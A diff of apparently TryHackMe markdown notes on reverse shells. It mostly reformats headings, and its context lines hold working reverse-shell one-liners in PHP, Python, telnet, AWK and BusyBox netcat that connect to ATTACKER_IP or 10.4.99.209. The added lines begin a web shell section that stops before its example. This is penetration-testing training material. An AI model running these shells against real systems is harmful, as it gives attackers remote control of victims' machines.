@@ -232,13 +232,11 @@ target@tryhackme:~$ php -r '$sock=fsockopen("ATTACKER_IP",443);popen("sh <&3 >&3
 
 This reverse shell uses `popen` to open a process file pointer, allowing the shell to be executed.
 
-## Python
+## ==`Python`==
 
 ### ﻿Please note, the following snippets below require using `python -c` to run, indicated by the placeholder PY-C  
 
 **Python Reverse Shell by Exporting Environment Variables**
-
-Terminal
 
 ```shell-session
 target@tryhackme:~$ export RHOST="ATTACKER_IP"; export RPORT=443; PY-C 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("bash")' 
@@ -248,8 +246,6 @@ This reverse shell sets the remote host and port as environment variables, crea
 
 **Python Reverse Shell Using the subprocess Module**
 
-Terminal
-
 ```shell-session
 target@tryhackme:~$ PY-C 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.4.99.209",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("bash")' 
 ```
@@ -258,19 +254,15 @@ This reverse shell uses the `subprocess` module to spawn a shell and set up a 
 
 **Short Python Reverse Shell**
 
-Terminal
-
 ```shell-session
 PY-C 'import os,pty,socket;s=socket.socket();s.connect(("ATTACKER_IP",443));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("bash")'
 ```
 
 This reverse shell creates a socket (`s`), connects to the attacker, and redirects standard input, output, and error to the socket using `os.dup2()`.
 
-Others  
+## ==`Others`==  
 
 **Telnet**
-
-Terminal
 
 ```shell-session
 target@tryhackme:~$ TF=$(mktemp -u); mkfifo $TF && telnet ATTACKER_IP443 0<$TF | sh 1>$TF
@@ -280,8 +272,6 @@ This reverse shell creates a named pipe using `mkfifo` and connects to the att
 
 **AWK**
 
-Terminal
-
 ```shell-session
 target@tryhackme:~$ awk 'BEGIN {s = "/inet/tcp/0/ATTACKER_IP/443"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null
 ```
@@ -290,10 +280,20 @@ This reverse shell uses AWK’s built-in TCP capabilities to connect to `ATTA
 
 **BusyBox**
 
-Terminal
-
 ```shell-session
 target@tryhackme:~$ busybox nc ATTACKER_IP 443 -e sh
 ```
 
 This BusyBox reverse shell uses Netcat (`nc`) to connect to the attacker at `ATTACKER_IP:443`. Once connected, it executes `/bin/sh`, exposing the command line to the attacker.
+
+---
+Web Shell
+
+A web shell is a script written in a language supported by a compromised web server that executes commands through the web server itself. A web shell is usually a file containing the code that executes commands and handles files. It can be hidden within a compromised web application or service, making it difficult to detect and very popular among attackers.
+
+Web shells can be written in several languages supported by web servers, like PHP, ASP, JSP, and even simple CGI scripts. 
+
+### Example PHP Web Shell
+
+
+Let’s look at an example PHP web shell to understand how this process works:
